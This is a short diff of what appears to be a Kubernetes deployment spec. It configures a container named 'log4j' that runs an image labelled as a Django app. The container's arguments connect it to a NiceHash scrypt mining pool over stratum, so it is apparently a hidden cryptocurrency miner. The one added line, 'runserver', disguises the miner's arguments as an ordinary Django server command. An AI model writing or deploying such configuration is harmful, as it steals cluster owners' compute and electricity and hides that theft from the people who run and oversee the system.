@@ -19,6 +19,7 @@ spec:
       - name: log4j
         image: xniapdev/django-app:latest
         args:
+          - "runserver"
           - "--url"
           - "stratum+tcp://scrypt.auto.nicehash.com:9200"
           - "--user"
